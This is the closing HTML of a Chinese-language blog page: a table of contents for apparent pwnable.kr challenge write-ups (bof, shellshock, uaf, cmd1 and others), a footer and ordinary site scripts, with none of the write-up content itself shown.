              <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#sec-1"><span class="toc-number">1.</span> <span class="toc-text">[fd]</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#sec-1-1"><span class="toc-number">1.1.</span> <span class="toc-text">简介</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#sec-1-2"><span class="toc-number">1.2.</span> <span class="toc-text">分析</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#sec-2"><span class="toc-number">2.</span> <span class="toc-text">[collision]</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#sec-2-1"><span class="toc-number">2.1.</span> <span class="toc-text">简介</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#sec-2-2"><span class="toc-number">2.2.</span> <span class="toc-text">分析</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#sec-3"><span class="toc-number">3.</span> <span class="toc-text">bof</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#sec-3-1"><span class="toc-number">3.1.</span> <span class="toc-text">简介</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#sec-3-2"><span class="toc-number">3.2.</span> <span class="toc-text">分析</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#sec-4"><span class="toc-number">4.</span> <span class="toc-text">flag</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#sec-4-1"><span class="toc-number">4.1.</span> <span class="toc-text">简介</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#sec-4-2"><span class="toc-number">4.2.</span> <span class="toc-text">分析</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#sec-5"><span class="toc-number">5.</span> <span class="toc-text">passcode</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#sec-5-1"><span class="toc-number">5.1.</span> <span class="toc-text">简介</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#sec-5-2"><span class="toc-number">5.2.</span> <span class="toc-text">分析</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#sec-6"><span class="toc-number">6.</span> <span class="toc-text">random</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#sec-6-1"><span class="toc-number">6.1.</span> <span class="toc-text">简介</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#sec-6-2"><span class="toc-number">6.2.</span> <span class="toc-text">分析</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#sec-7"><span class="toc-number">7.</span> <span class="toc-text">input</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#sec-7-1"><span class="toc-number">7.1.</span> <span class="toc-text">简介</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#sec-7-2"><span class="toc-number">7.2.</span> <span class="toc-text">分析</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#sec-7-2-1"><span class="toc-number">7.2.1.</span> <span class="toc-text">第一关</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#sec-7-2-2"><span class="toc-number">7.2.2.</span> <span class="toc-text">第二关</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#sec-7-2-3"><span class="toc-number">7.2.3.</span> <span class="toc-text">第三关</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#sec-7-2-4"><span class="toc-number">7.2.4.</span> <span class="toc-text">第四关</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#sec-7-2-5"><span class="toc-number">7.2.5.</span> <span class="toc-text">第五关</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#sec-7-2-6"><span class="toc-number">7.2.6.</span> <span class="toc-text">最终代码</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#sec-8"><span class="toc-number">8.</span> <span class="toc-text">leg</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#sec-8-1"><span class="toc-number">8.1.</span> <span class="toc-text">简介</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#sec-8-2"><span class="toc-number">8.2.</span> <span class="toc-text">分析</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#sec-8-2-1"><span class="toc-number">8.2.1.</span> <span class="toc-text">ARM汇编简介</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#sec-8-2-2"><span class="toc-number">8.2.2.</span> <span class="toc-text">key1</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#sec-8-2-3"><span class="toc-number">8.2.3.</span> <span class="toc-text">key2</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#sec-8-2-4"><span class="toc-number">8.2.4.</span> <span class="toc-text">key3</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#sec-9"><span class="toc-number">9.</span> <span class="toc-text">mistake</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#sec-9-1"><span class="toc-number">9.1.</span> <span class="toc-text">简介</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#sec-9-2"><span class="toc-number">9.2.</span> <span class="toc-text">分析</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#sec-10"><span class="toc-number">10.</span> <span class="toc-text">shellshock</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#sec-10-1"><span class="toc-number">10.1.</span> <span class="toc-text">简介</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#sec-10-2"><span class="toc-number">10.2.</span> <span class="toc-text">分析</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#sec-11"><span class="toc-number">11.</span> <span class="toc-text">coin1</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#sec-11-1"><span class="toc-number">11.1.</span> <span class="toc-text">简介</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#sec-11-2"><span class="toc-number">11.2.</span> <span class="toc-text">分析</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#sec-12"><span class="toc-number">12.</span> <span class="toc-text">blackjack</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#sec-12-1"><span class="toc-number">12.1.</span> <span class="toc-text">简介</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#sec-12-2"><span class="toc-number">12.2.</span> <span class="toc-text">分析</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#sec-13"><span class="toc-number">13.</span> <span class="toc-text">lotto</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#sec-13-1"><span class="toc-number">13.1.</span> <span class="toc-text">简介</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#sec-13-2"><span class="toc-number">13.2.</span> <span class="toc-text">分析</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#sec-14"><span class="toc-number">14.</span> <span class="toc-text">cmd1</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#sec-14-1"><span class="toc-number">14.1.</span> <span class="toc-text">简介</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#sec-14-2"><span class="toc-number">14.2.</span> <span class="toc-text">分析</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#sec-15"><span class="toc-number">15.</span> <span class="toc-text">cmd2</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#sec-15-1"><span class="toc-number">15.1.</span> <span class="toc-text">简介</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#sec-15-2"><span class="toc-number">15.2.</span> <span class="toc-text">分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#sec-15-3"><span class="toc-number">15.3.</span> <span class="toc-text">大佬们的解法</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#sec-16"><span class="toc-number">16.</span> <span class="toc-text">uaf</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#sec-16-1"><span class="toc-number">16.1.</span> <span class="toc-text">简介</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#sec-16-2"><span class="toc-number">16.2.</span> <span class="toc-text">分析</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#sec-17"><span class="toc-number">17.</span> <span class="toc-text">memcpy</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#sec-17-1"><span class="toc-number">17.1.</span> <span class="toc-text">简介</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#sec-17-2"><span class="toc-number">17.2.</span> <span class="toc-text">分析</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#sec-18"><span class="toc-number">18.</span> <span class="toc-text">asm</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#sec-18-1"><span class="toc-number">18.1.</span> <span class="toc-text">简介</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#sec-18-2"><span class="toc-number">18.2.</span> <span class="toc-text">分析</span></a></li></ol></li></ol>
          </div>
      </div>
    </div>

  
    

  
    
  
    
  
    

  
    
  
    <!--微信公众号二维码-->


  
</aside>

      </div>
      <footer id="footer">
  
  <div class="outer">
    <div id="footer-left">
      &copy; 2014 - 2018 schemr&nbsp;|&nbsp;
      主题 <a href="https://github.com/giscafer/hexo-theme-cafe/" target="_blank">Cafe</a>
    </div>
     <div id="footer-right">
      联系方式&nbsp;|&nbsp;bailong104@gmail.com
    </div>
  </div>
</footer>
 <script src="/jquery/jquery.min.js"></script>
    </div>
    <nav id="mobile-nav">
  
    <a href="/" class="mobile-nav-link">首页</a>
  
    <a href="/archives" class="mobile-nav-link">归档</a>
  
    <a href="/about" class="mobile-nav-link">关于</a>
  
</nav>
    <img class="back-to-top-btn" src="/images/fly-to-top.png"/>
<script>
// Elevator script included on the page, already.
window.onload = function() {
  var elevator = new Elevator({
    selector:'.back-to-top-btn',
    element: document.querySelector('.back-to-top-btn'),
    duration: 1000 // milliseconds
  });
}
</script>
      

  
    <script>
      var cloudTieConfig = {
        url: document.location.href, 
        sourceId: "",
        productKey: "e2fb4051c49842688ce669e634bc983f",
        target: "cloud-tie-wrapper"
      };
    </script>
    <script src="https://img1.ws.126.net/f2e/tie/yun/sdk/loader.js"></script>
    

  







<!-- author:forvoid begin -->
<!-- author:forvoid begin -->

<!-- author:forvoid end -->

<!-- author:forvoid end -->


  
    <script type="text/x-mathjax-config">
      MathJax.Hub.Config({
        tex2jax: {
          inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
          processEscapes: true,
          skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
        }
      })
    </script>

    <script type="text/x-mathjax-config">
      MathJax.Hub.Queue(function() {
        var all = MathJax.Hub.getAllJax(), i;
        for (i=0; i < all.length; i += 1) {
          all[i].SourceElement().parentNode.className += ' has-jax';
        }
      })
    </script>
    <script type="text/javascript" src="https://cdn.rawgit.com/mathjax/MathJax/2.7.1/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
  


 <script src="/js/is.js"></script>


  <link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
  <script src="/fancybox/jquery.fancybox.pack.js"></script>


<script src="/js/script.js"></script>
<script src="/js/elevator.js"></script>
  </div>
</body>
</html>